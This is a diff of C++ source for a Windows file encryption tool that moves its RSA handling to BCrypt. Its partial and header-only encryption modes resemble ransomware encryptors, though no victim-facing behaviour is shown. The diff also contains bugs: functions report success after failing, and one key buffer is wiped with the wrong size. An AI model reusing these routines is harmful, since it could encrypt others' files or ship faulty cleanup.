@@ -17,8 +17,7 @@
 
 #define SET(v,w) ((v) = (w))
 
-STATIC BOOL VER = FALSE;
-
+std::mutex g_MutexBcrypt;
 
 STATIC BOOL WriteFullData
 (
@@ -60,86 +59,81 @@ BOOL filesystem::getParseFile
 (
 	PFILE_INFO FileInfo
 )
-{	
-	HANDLE hFile = NULL;	
-	hFile = CreateFileW(FileInfo->FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);	
+{		
+	FileInfo->FileHandle = CreateFileW(FileInfo->FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
-	if (hFile == INVALID_HANDLE_VALUE)
+	if (FileInfo->FileHandle == INVALID_HANDLE_VALUE)
 	{
-		LOG_ERROR(L"File %ls is already open by another program", FileInfo->Filename);
-		FileInfo->FileHandle = hFile;
+		LOG_ERROR(L"[GetParseFile] Failed File is already open by another program; %ls", FileInfo->Filename);		
 		return FALSE;
-	}
-	FileInfo->FileHandle = hFile;
+	}	
 
 	LARGE_INTEGER FileSize;
-	if (!GetFileSizeEx(hFile, &FileSize))
+	if (!GetFileSizeEx(FileInfo->FileHandle, &FileSize))
 	{
-		LOG_ERROR(L"\"%ls\" - file must not be empty", FileInfo->Filename);
+		LOG_ERROR(L"[GetParseFile] Failed file must not be empty; %ls", FileInfo->Filename);
 		return FALSE;
 	}
 	if (!FileSize.QuadPart)
 	{
-		LOG_ERROR(L"\"%ls\" - file must not be empty", FileInfo->Filename);
+		LOG_ERROR(L"[GetParseFile] Failed file must not be empty; %ls", FileInfo->Filename);
 		return FALSE;
 	}
 	FileInfo->Filesize = FileSize.QuadPart;
 	return TRUE;
 }
 
-BOOL filesystem::CreateFileOpen(PFILE_INFO FileInfo)
+BOOL filesystem::CreateFileOpen(PFILE_INFO FileInfo, DWORD state_const)
 {
-	 HANDLE hNewFile = CreateFileW(FileInfo->newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
-	if (hNewFile == INVALID_HANDLE_VALUE)
+	FileInfo->newFileHandle = CreateFileW(FileInfo->newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, state_const, 0, NULL);
+	if (FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
 	{
-		LOG_ERROR(L"\"%ls\" - Failed Create File; GetLastError = %lu", FileInfo->newFilename, GetLastError());		
-		FileInfo->newFileHandle = INVALID_HANDLE_VALUE;
+		LOG_ERROR(L"[CreateFileOpen] Failed Create File; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());			
 		return FALSE;
-	}
-	FileInfo->newFileHandle = hNewFile;
+	}	 
 	return TRUE;
 }
 
 BOOL filesystem::EncryptFileFullData(PFILE_INFO FileInfo)
 {
+	BOOL success = FALSE;
 	DWORD BytesRead = FileInfo->Filesize;
+	DWORD dwread = 0;
 	DWORD padding = 0;	
 	BOOL isAes = FileInfo->CryptInfo->method_policy == AES256 || FileInfo->CryptInfo->method_policy == RSA_AES256;
 	if (isAes && global::GetDeCrypt() == EncryptCipher::CRYPT)
 		padding = aes256_padding(BytesRead) - BytesRead;
-		
 	
 	BYTE* FileBuffer = (BYTE*)memory::m_malloc(BytesRead + padding);
 	if (!FileBuffer)
 	{
-		LOG_ERROR(L"Large File Size %ls. Buffer heap crash", FileInfo->Filename);
-		return FALSE;
+		LOG_ERROR(L"[EncryptFileFullData] Large File Size %ls. Buffer heap crash", FileInfo->Filename);
+		goto end;
 	}
 
-	DWORD dwread = 0;	
 	if (!ReadFile(FileInfo->FileHandle, FileBuffer, BytesRead, &dwread, NULL))
 	{
-		LOG_ERROR(L"File %ls is failed to ReadFile", FileInfo->Filename);
-		memory::m_free(FileBuffer);
-		return FALSE;
+		LOG_ERROR(L"[EncryptFileFullData] File is failed to ReadFile; %ls", FileInfo->Filename);
+		goto end;
 	}
-	
-	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, FileBuffer, FileBuffer, BytesRead);
+		
+	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, BytesRead);
 	
 	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, BytesRead + padding))
 	{
-		LOG_ERROR(L"File %ls is failed to write\n", FileInfo->Filename);
-		memory::m_free(FileBuffer);
-		return FALSE;
+		LOG_ERROR(L"[EncryptFileFullData] File is failed to write; %ls", FileInfo->Filename);
+		goto end;
 	}
 	
 	if(isAes && global::GetDeCrypt() == EncryptCipher::DECRYPT)
 	{
-		SetFilePointer(FileInfo->newFileHandle, -FileInfo->CryptInfo->padding, NULL, FILE_END);
-		SetEndOfFile(FileInfo->newFileHandle);
+		SetFilePointer(FileInfo->newFileHandle, -FileInfo->padding, NULL, FILE_END);
+		SetEndOfFile(FileInfo->newFileHandle);		
 	}
 
-	memory::m_free(FileBuffer);	
+	success = TRUE;
+end:
+	if(FileBuffer) memory::m_free(FileBuffer);	
 	return TRUE;
 }
 
@@ -183,7 +177,7 @@ BOOL filesystem::EncryptFilePartly
 	{
 		if (PartSize < AES_BLOCK_SIZE)
 		{
-			LOG_ERROR(L"Failed EncryptFilePartly small size file, size must be >= 300 byte. Filename: %ls\n", FileInfo->Filename);
+			LOG_ERROR(L"[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: %ls\n", FileInfo->Filename);
 			return FALSE;
 		}
 		multiply = PartSize % 16;
@@ -194,7 +188,7 @@ BOOL filesystem::EncryptFilePartly
 	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
 	if (!BufferPart || !BufferStep)
 	{
-		LOG_ERROR(L"Large File Size %ls. Buffer heap crash.\n", FileInfo->Filename);
+		LOG_ERROR(L"[EncryptFilePartly] Large File Size. Buffer heap crash; %ls", FileInfo->Filename);
 		return FALSE;
 	}
 
@@ -202,15 +196,15 @@ BOOL filesystem::EncryptFilePartly
 	{
 		if (!ReadFile(FileInfo->FileHandle, BufferPart, PartSize, &BytesRead, NULL) || !BytesRead)
 		{	 
-			LOG_ERROR(L"File %ls is failed to Read Data.\n", FileInfo->FilePath);
+			LOG_ERROR(L"[EncryptFilePartly] Failed File to Read Data; %ls", FileInfo->FilePath);
 			goto end;
 		}
 
-		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, BufferPart, BufferPart, BytesRead - multiply);
+		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);
 
 		if (!WriteFullData(FileInfo->newFileHandle, BufferPart, BytesRead))
 		{
-			LOG_ERROR(L"File %ls is failed to Write data.\n", FileInfo->FilePath);
+			LOG_ERROR(L"[EncryptFilePartly] Failed File to Write data; %ls", FileInfo->FilePath);
 			goto end;
 		}
 		TotalRead = 0;
@@ -247,29 +241,24 @@ BOOL filesystem::EncryptFileBlock
 
 	while(ReadFile(FileInfo->FileHandle, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
 	{
-		if (FileInfo->CryptInfo->method_policy == AES256 && BytesRead < 1048576)
+		if (BytesRead < 1048576 && FileInfo->CryptInfo->method_policy == AES256)
 		{
-			if (FileInfo->CryptInfo->mode == MODE_AES::AES_CRYPT_NO_PADDING)
-			{
-				FileInfo->CryptInfo->mode = MODE_AES::AES_CRYPT;				
-				padding = aes256_padding(BytesRead) - BytesRead;
-			}
-			else if(FileInfo->CryptInfo->mode == MODE_AES::AES_DECRYPT_NO_PADDING)
-				FileInfo->CryptInfo->mode = MODE_AES::AES_DECRYPT;			
+			padding = BytesRead % 16;
+			BytesRead -= padding;			
 		}
-			
-		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, Buffer, Buffer, BytesRead);
+		
+		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);
 
 		if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead + padding))
 		{
-			LOG_ERROR(L"WriteFullData failed. GetLastError = %lu.\n", GetLastError());
+			LOG_ERROR(L"[EncryptFileBlock] [WriteFullData] Failed. GetLastError = %lu", GetLastError());
 			goto end;
 		}
 	}
 
 	if (FileInfo->CryptInfo->method_policy == AES256 && global::GetDeCrypt() == EncryptCipher::DECRYPT)
 	{
-		SetFilePointer(FileInfo->newFileHandle, -FileInfo->CryptInfo->padding, NULL, FILE_END);
+		SetFilePointer(FileInfo->newFileHandle, -FileInfo->padding, NULL, FILE_END);
 		SetEndOfFile(FileInfo->newFileHandle);
 	}
 
@@ -283,10 +272,10 @@ BOOL filesystem::EncryptFileHeader
 (
 	PFILE_INFO FileInfo
 )
-{
-	if (FileInfo->Filesize < 1052599)
+{	
+	if (FileInfo->Filesize < 1048576)
 	{
-		LOG_ERROR(L"For EncryptFileHeader FileSize must be > 1.03 KB. %ls\n", FileInfo->Filename);
+		LOG_ERROR(L"[EncryptFileHeader] FileSize must be > 1.0 MB; %ls", FileInfo->Filename);		
 		return FALSE;
 	}
 
@@ -301,21 +290,21 @@ BOOL filesystem::EncryptFileHeader
 	}
 	if (!ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL))
 	{
-		LOG_ERROR(L"Failed EncryptFileHeader ReadFile in %ls; GetLastError = %lu\n", FileInfo->Filename, GetLastError());
+		LOG_ERROR(L"[EncryptFileHeader] Failed ReadFile; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 		goto end;
 	}
 	
 	if (BytesRead == 0)
 	{
-		LOG_ERROR(L"Unexpected BytesRead. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[EncryptFileHeader] Unexpected BytesRead. GetLastError = %lu", GetLastError());
 		goto end;
 	}
 
-	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);
+	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);	
 	
 	if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesEncrypt))
 	{
-		LOG_ERROR(L"WriteFullData failed. GetLastError = %lu.\n", GetLastError());
+		LOG_ERROR(L"[EncryptFileHeader] [WriteFullData] failed. GetLastError = %lu", GetLastError());
 		goto end;
 	}
 
@@ -323,7 +312,7 @@ BOOL filesystem::EncryptFileHeader
 	{
 		if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead))
 		{
-			LOG_ERROR(L"WriteFullData failed. GetLastError = %lu.\n", GetLastError());
+			LOG_ERROR(L"[EncryptFileHeader] [WriteFullData] failed. GetLastError = %lu", GetLastError());
 			goto end;
 		}
 	}
@@ -415,7 +404,7 @@ BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
 		{
 			if (!filesystem::EncryptFileFullData(FileInfo))
 			{
-				LOG_ERROR(L"Failed %ls to EncryptFileFullData. GetLastError = %lu", FileInfo->Filename, GetLastError());
+				LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileFullData]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 				return FALSE;
 			}
 			mode = EncryptModes::FULL_ENCRYPT;
@@ -424,7 +413,7 @@ BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
 		{
 			if (!filesystem::EncryptFilePartly(FileInfo, 20))
 			{
-				LOG_ERROR(L"Failed %ls to EncryptFilePartly. GetLastError = %lu", FileInfo->Filename, GetLastError());
+				LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFilePartly]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 				return FALSE;
 			}
 			mode = EncryptModes::PARTLY_ENCRYPT;
@@ -433,7 +422,7 @@ BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
 		{
 			if (!filesystem::EncryptFileHeader(FileInfo))
 			{
-				LOG_ERROR(L"Failed %ls to EncryptFileHeader. GetLastError = %lu", FileInfo->Filename, GetLastError());
+				LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileHeader]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 				return FALSE;
 			}
 			mode = EncryptModes::HEADER_ENCRYPT;
@@ -443,7 +432,7 @@ BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
 	{
 		if (!filesystem::EncryptFileFullData(FileInfo))
 		{
-			LOG_ERROR(L"Failed %ls to EncryptFileFullData. GetLastError = %lu", FileInfo->Filename, GetLastError());
+			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileFullData]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 			return FALSE;
 		}
 		mode = EncryptModes::FULL_ENCRYPT;
@@ -452,7 +441,7 @@ BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
 	{
 		if (!filesystem::EncryptFilePartly(FileInfo, 20))
 		{
-			LOG_ERROR(L"Failed %ls to EncryptFilePartly. GetLastError = %lu", FileInfo->Filename, GetLastError());
+			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFilePartly]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 			return FALSE;
 		}
 		mode = EncryptModes::PARTLY_ENCRYPT;
@@ -461,7 +450,7 @@ BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
 	{
 		if (!filesystem::EncryptFileHeader(FileInfo))
 		{
-			LOG_ERROR(L"Failed %ls to EncryptFileHeader. GetLastError = %lu", FileInfo->Filename, GetLastError());
+			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileHeader]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 			return FALSE;
 		}
 		mode = EncryptModes::HEADER_ENCRYPT;
@@ -470,7 +459,7 @@ BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
 	{
 		if (!filesystem::EncryptFileBlock(FileInfo))
 		{
-			LOG_ERROR(L"Failed %ls to EncryptFileBlock. GetLastError = %lu", FileInfo->Filename, GetLastError());
+			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileBlock]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 			return FALSE;
 		}
 		mode = EncryptModes::BLOCK_ENCRYPT;
@@ -638,19 +627,19 @@ BOOL filesystem::DropRSAKey
 	HANDLE hFile_pub = NULL;
 	std::wstring key_pub(Path);	
 	key_pub += std::wstring(L"/RSA_public_key_laced.txt");
-	LOG_INFO(L"Path public_key_file\t%ls\n", key_pub.c_str());
+	LOG_INFO(L"Path public_key_file\t%ls", key_pub.c_str());
 	
 	hFile_pub = CreateFileW(key_pub.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 
 	std::wstring key_prv(Path);	
 	key_prv += std::wstring(L"/RSA_private_key_laced.txt");
-	LOG_INFO(L"Path private_key_file\t%ls\n", key_prv.c_str());
+	LOG_INFO(L"Path private_key_file\t%ls", key_prv.c_str());
 
 	hFile_prv = CreateFileW(key_prv.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 
 	if (hFile_pub == INVALID_HANDLE_VALUE || hFile_prv == INVALID_HANDLE_VALUE)
 	{
-		LOG_ERROR(L"Failed create key files %ls. GetLastError = %lu\n", Path, GetLastError());
+		LOG_ERROR(L"Failed create key files %ls. GetLastError = %lu", Path, GetLastError());
 		goto END;
 	}
 
@@ -663,18 +652,18 @@ BOOL filesystem::DropRSAKey
 
 		if (!Base64Encode(&Base64PublicKey, PublicKey, SizeKey, &size_pub, BINARY_CRYPT))
 		{
-			LOG_ERROR(L"Failed Public Key convert Base64 file %ls. GetLastError = %lu\n", Path, GetLastError());
+			LOG_ERROR(L"[Base64Encode] Failed Public Key convert Base64; %ls; GetLastError = %lu", Path, GetLastError());
 			goto ENDB;
 		}
 		if (!Base64Encode(&Base64PrivateKey, PrivateKey, p_SizeKey, &size_prv, BINARY_CRYPT))
 		{
-			LOG_ERROR(L"Failed Private Key convert Base64 file %ls. GetLastError = %lu\n", Path, GetLastError());
+			LOG_ERROR(L"[Base64Encode] Failed Private Key convert Base64; %ls; GetLastError = %lu", Path, GetLastError());
 			goto ENDB;
 		}
 		
 		if (Base64PublicKey == NULL || Base64PrivateKey == NULL)
 		{
-			LOG_ERROR(L"Failed RSA Key convert Base64 file. GetLastError = %lu\n", GetLastError());
+			LOG_ERROR(L"[Base64Encode] Failed RSA Key convert Base64; GetLastError = %lu", GetLastError());
 			goto ENDB;
 		}
 		LARGE_INTEGER Offset;
@@ -683,7 +672,7 @@ BOOL filesystem::DropRSAKey
 
 		if (!WriteFullData(hFile_pub, Base64PublicKey, size_pub))
 		{
-			LOG_ERROR(L"Failed to write public key\n");
+			LOG_ERROR(L"[WriteFullData] Failed to write public key");
 			goto ENDB;
 		}
 
@@ -693,7 +682,7 @@ BOOL filesystem::DropRSAKey
 
 		if (!WriteFullData(hFile_prv, Base64PrivateKey, size_prv))
 		{
-			LOG_ERROR(L"Failed to write private key\n");
+			LOG_ERROR(L"[WriteFullData] Failed to write private key");
 			goto ENDB;
 		}
 
@@ -701,9 +690,15 @@ BOOL filesystem::DropRSAKey
 
 	ENDB:
 		if (Base64PublicKey)
+		{
+			memory::memzero_explicit(Base64PublicKey, size_pub);
 			memory::m_free(Base64PublicKey);
+		}
 		if (Base64PrivateKey)
+		{
+			memory::memzero_explicit(Base64PublicKey, size_prv);
 			memory::m_free(Base64PrivateKey);
+		}
 		if (hFile_pub)
 			CloseHandle(hFile_pub);
 		if (hFile_prv)
@@ -719,7 +714,7 @@ BOOL filesystem::DropRSAKey
 
 	if (!WriteFullData(hFile_pub, PublicKey, SizeKey))
 	{
-		LOG_ERROR(L"Failed to write public key\n");
+		LOG_ERROR(L"[WriteFullData] Failed to write public key\n");
 		goto END;
 	}
 
@@ -729,13 +724,9 @@ BOOL filesystem::DropRSAKey
 
 	if (!WriteFullData(hFile_prv, PrivateKey, p_SizeKey))
 	{
-		LOG_ERROR(L"Failed to write private key\n");
+		LOG_ERROR(L"[WriteFullData] Failed to write private key\n");
 		goto END;
 	}
-
-
-	if (GetLastError() && GetLastError() != 131)
-		LOG_ERROR(L"GetLastError %lu CheckWINAPI %ls\n", GetLastError(), Path);
 
 	SUCCESS_return = TRUE;
 	
@@ -749,180 +740,312 @@ END:
 }
 
 
-STATIC BOOL ReadRSAFile
-(
-	WCHAR* KeyFile,
-	BYTE* BuffRSA,
-	HCRYPTKEY* RsaKey,
-	HCRYPTPROV* CryptoProvider
-)
-
+BOOL HandleError(NTSTATUS status)
 {
-	BOOL SUCCESS_return = FALSE;
-	HANDLE hCryptFile = NULL;	
-	DWORD sizeKey;
-	DWORD dwread;
-
-	if (VER)
+	if (!BCRYPT_SUCCESS(status))
 	{
-		if (!CryptAcquireContextA(CryptoProvider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
-		{
-			LOG_ERROR(L"Failed create provider. GetLastError = %lu.\n", GetLastError());
-			return FALSE;
-		}
-	}
-	else
-	{
-		if (!CryptAcquireContextA(CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
-		{
-			LOG_ERROR(L"Failed create provider. GetLastError = %lu.\n", GetLastError());
-			return FALSE;
-		}
-	}
-	
-
-
-	hCryptFile = CreateFileW(KeyFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-	if (hCryptFile == INVALID_HANDLE_VALUE)
-	{
-		LOG_ERROR(L"Failed Open key file. %ls. GetLastError = %lu\n", KeyFile, GetLastError());
+		LOG_ERROR(L"BCrypt API failed. NTSTATUS = 0x%02X", status);
 		return FALSE;
 	}
+
+	return TRUE;
+}
+
+
+BOOL filesystem::HandlerGenKeyPairRSA()
+{
+	BCRYPT_ALG_HANDLE hProvider = NULL;
+	BCRYPT_KEY_HANDLE hKey = NULL;
+	NTSTATUS status = 0;
+	DWORD dwPublicKeySize = 0;
+	DWORD dwPrivateKeySize = 0;
+	BYTE* PublicKey = NULL;
+	BYTE* PrivateKey = NULL;
+
+
+	if (!HandleError
+		(BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_RSA_ALGORITHM, NULL, 0)))
+	{
+		LOG_ERROR(L"[BCryptOpenAlgorithmProvider] Failed");
+		goto end;
+	}
+	
+	if (!HandleError
+		(BCryptGenerateKeyPair(hProvider, &hKey, global::GetBitKey(), 0)))
+	{
+		LOG_ERROR(L"[BCryptGenerateKeyPair] Failed");
+		goto end;
+	}
+
+	if (!HandleError
+		(BCryptFinalizeKeyPair(hKey, 0)))
+	{
+		LOG_ERROR(L"[BCryptFinalizeKeyPair] Failed");
+		goto end;
+	}
+
+	if (!HandleError
+		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, 0, &dwPublicKeySize, 0)))
+	{
+		LOG_ERROR(L"[BCryptExportKeySize] Failed");
+		goto end;
+	}
+
+	PublicKey = (BYTE*)memory::m_malloc(dwPublicKeySize);	
+	if (!HandleError
+		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, PublicKey, dwPublicKeySize, &dwPublicKeySize, 0)))
+	{
+		LOG_ERROR(L"[BCryptExportKey] Failed");
+		goto end;
+	}
+	
+	if (!HandleError
+		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, NULL, 0, &dwPrivateKeySize, 0)))
+	{
+		LOG_ERROR(L"[BCryptExportKeySize] Failed");
+		goto end;
+	}
+
+	PrivateKey = (BYTE*)memory::m_malloc(dwPrivateKeySize);	
+	if (!HandleError
+		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, PrivateKey, dwPrivateKeySize, &dwPrivateKeySize, 0)))
+	{
+		LOG_ERROR(L"[BCryptExportKey] Failed");
+		goto end;
+	}
+
+	if (!DropRSAKey(global::GetPath(), PublicKey, PrivateKey, dwPublicKeySize, dwPrivateKeySize))
+	{
+		LOG_ERROR(L"[DropRSAKey] Failed; path %ls; GetLastError = %lu", global::GetPath(), GetLastError());
+		goto end;
+	}
+
+	LOG_SUCCESS(L"Public Key (%lu bytes) generated and saved in: %ls\n", dwPublicKeySize, global::GetPath());
+	LOG_SUCCESS(L"Private Key (%lu bytes) generated and saved in: %ls\n", dwPrivateKeySize, global::GetPath());
+
+end:
+	if (PublicKey)
+	{
+		memory::memzero_explicit(PublicKey, dwPublicKeySize);
+		memory::m_free(PublicKey);
+	}
+	if (PrivateKey)
+	{
+		memory::memzero_explicit(PrivateKey, dwPrivateKeySize);
+		memory::m_free(PrivateKey);
+	}
+	if (hKey)
+		BCryptDestroyKey(hKey);
+	if (hProvider)
+		BCryptCloseAlgorithmProvider(hProvider, 0);
+
+	return TRUE;
+}
+
+
+BOOL filesystem::ReadRSAFile
+(
+	CRYPT_INFO* CryptInfo
+)
+{
+	BOOL success = FALSE;
+	HANDLE hCryptFile = NULL;	
+	DWORD dwread;
+	NTSTATUS status;
+	DWORD resByte = 0;
+
+	status = BCryptOpenAlgorithmProvider(&CryptInfo->desc.crypto_provider, BCRYPT_RSA_ALGORITHM, NULL, 0);
+	if(!HandleError(status))
+	{
+		LOG_ERROR(L"[BCryptOpenAlgorithmProvider] Failed");
+		return FALSE;
+	}
+
+	hCryptFile = CreateFileW(CryptInfo->desc.rsa_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hCryptFile == INVALID_HANDLE_VALUE)
+	{
+		LOG_ERROR(L"[ReadRSAFile] Failed Open key file; %ls; GetLastError = %lu", CryptInfo->desc.rsa_path, GetLastError());
+		return FALSE;
+	}
+
 	LARGE_INTEGER FileSize;
 	if (!GetFileSizeEx(hCryptFile, &FileSize) || FileSize.QuadPart == 0)
 	{
-		LOG_ERROR(L"The file %ls must not be empty.\n", KeyFile);
-		goto END;
+		LOG_ERROR(L"[ReadRSAFile] File must not be empty; %ls", CryptInfo->desc.rsa_path);
+		return FALSE;
 	}
 
-	sizeKey = FileSize.QuadPart;
-	if (!ReadFile(hCryptFile, BuffRSA, sizeKey, &dwread, NULL) || dwread != FileSize.QuadPart)
+	CryptInfo->desc.size = FileSize.QuadPart;
+	if (!ReadFile(hCryptFile, CryptInfo->desc.key_data, CryptInfo->desc.size, &dwread, NULL) || dwread != FileSize.QuadPart)
 	{
-		LOG_ERROR(L"Key %ls is failed to ReadFile.\n", KeyFile);
-		goto END;
+		LOG_ERROR(L"[ReadRSAFile] Failed Key ReadFile; %ls", CryptInfo->desc.rsa_path);
+		return FALSE;
 	}
+	
+	
+	CONST WCHAR* bcrpyt_blob = global::GetDeCrypt() == EncryptCipher::CRYPT ? BCRYPT_RSAPUBLIC_BLOB : BCRYPT_RSAPRIVATE_BLOB;
 
 	if (global::GetRsaBase64())
 	{
 		VOID* Base64Key = NULL;
 		DWORD size;
-		if (!Base64Encode(&Base64Key, BuffRSA, sizeKey, &size, BASE_CRYPT))
+		if (!Base64Encode(&Base64Key, CryptInfo->desc.key_data, CryptInfo->desc.size, &size, BASE_CRYPT))
 		{
-			LOG_ERROR(L"Failed RSA Key convert Base64 file %ls. GetLastError = %lu\n", KeyFile, GetLastError());
+			LOG_ERROR(L"[ReadRSAFile] Failed RSA Key convert Base64; %ls. GetLastError = %lu", CryptInfo->desc.rsa_path, GetLastError());
 			goto END;
 		}
 
 		if (Base64Key == NULL)
 		{
-			LOG_ERROR(L"Failed RSA Key convert Base64 file %ls. GetLastError = %lu\n", KeyFile, GetLastError());
-			goto END;
-		}		
-				
-		if (!CryptImportKey(*CryptoProvider, (BYTE*)Base64Key, size, 0, 0, RsaKey))
-		{
-			LOG_ERROR(L"Failed import Key. GetLastError = %lu.\n", GetLastError());
-			memory::m_free(Base64Key);
+			LOG_ERROR(L"[ReadRSAFile] Failed RSA Key convert Base64; %ls. GetLastError = %lu", CryptInfo->desc.rsa_path, GetLastError());
 			goto END;
 		}
+						
+		if (!HandleError
+			(
+				BCryptImportKeyPair(CryptInfo->desc.crypto_provider, 
+				NULL, bcrpyt_blob,
+				&CryptInfo->desc.handle_rsa_key, (BYTE*)Base64Key, 
+				size, 0))
+			)
+		{
+			LOG_ERROR(L"[ReadRSAFile] [BCryptImportKeyPair] Failed");
+			goto END;
+		}
+		CryptInfo->desc.size = size;
 		memory::memzero_explicit(Base64Key, size);
 		memory::m_free(Base64Key);
-		SUCCESS_return = TRUE;
+		success = TRUE;
 		goto END;
+	}
+	else
+	{		
+		if (!HandleError
+		(
+			BCryptImportKeyPair
+			(
+				CryptInfo->desc.crypto_provider,
+				NULL, bcrpyt_blob,
+				&CryptInfo->desc.handle_rsa_key, CryptInfo->desc.key_data,
+				CryptInfo->desc.size, 0
+			)
+		))
+		{
+			LOG_ERROR(L"[ReadRSAFile] [BCryptImportKeyPair] Failed");
+			LOG_INFO(L"[ReadRSAFile] if key in format Base64 - check flag -B64");
+			goto END;
+		}
 	}
 	
-	if (!CryptImportKey(*CryptoProvider, BuffRSA, dwread, 0, 0, RsaKey))
+	
+	status = BCryptGetProperty
+	(
+		CryptInfo->desc.handle_rsa_key,
+		BCRYPT_KEY_LENGTH,
+		(PUCHAR)&CryptInfo->desc.size,
+		sizeof(CryptInfo->desc.size),
+		&resByte,
+		0
+	);
+	if (!HandleError(status) || resByte != 4)
 	{
-		printf_s("Failed import Key. GetLastError = %lu.\n", GetLastError());
-		printf_s("if key in Base64 format - check flag -Base64\n");
+		LOG_ERROR(L"[ReadRSAFile] Failed Get size");
 		goto END;
 	}
-	SUCCESS_return = TRUE;
+	if ((CryptInfo->desc.size /= 8) % 8 != 0)
+	{
+		LOG_ERROR(L"[ReadRSAFile] Invalid Size");
+		goto END;
+	}
+
+	success = TRUE;
 END:
 	if (hCryptFile != NULL && hCryptFile != INVALID_HANDLE_VALUE)
 		CloseHandle(hCryptFile);
-	return SUCCESS_return;
+	return success;
 }
 
 
-/*ONLY RSA & ONLY (RSA_BIT - 11) >= FILESIZE*/
+/*	ONLY RSA & ONLY (RSA_BYTE - 11) => FILESIZE	*/
 BOOL filesystem::EncryptRSA 
 (	
-	PFILE_INFO FileInfo,
-	WCHAR* KeyFile	
+	PFILE_INFO FileInfo
 )
 {
 	BOOL SUCCESS_return = FALSE;	
-	HCRYPTPROV CryptoProvider = 0;
-	HCRYPTKEY RsaKey = 0;
-
-	BYTE* FileBuffer = NULL;
-
+	NTSTATUS status;
 	DWORD size = 0;
 	DWORD dwDataLen = 0;
 
-	BYTE BuffKey[4096] = { 0 };
-	
-	if(!ReadRSAFile(KeyFile, BuffKey, &RsaKey, &CryptoProvider))
+	if (global::GetDeCrypt() == EncryptCipher::CRYPT && FileInfo->Filesize >= FileInfo->CryptInfo->desc.size - 11)
 	{
-		LOG_ERROR(L"Failed get RSA File - %ls. GetLastError = %lu.\n", KeyFile, GetLastError());
+		LOG_ERROR(L"[EncryptRSA] Invalid Size File >= RSA_BYTE - PADDING(11); %ls", FileInfo->Filename);
 		return FALSE;
 	}
-	
-	if (!CryptEncrypt(RsaKey, 0, TRUE, 0, NULL, &dwDataLen, 0))
+	else if (global::GetDeCrypt() == EncryptCipher::DECRYPT && FileInfo->Filesize < FileInfo->CryptInfo->desc.size)
 	{
-		LOG_ERROR(L"Failed get size CryptEncrypt. GetLastError = %lu\n", GetLastError());
-		LOG_ERROR(L"NTE_BAD_LEN - %lu\tRSA_BIT > FILESIZE\n", NTE_BAD_LEN);
-		goto END;
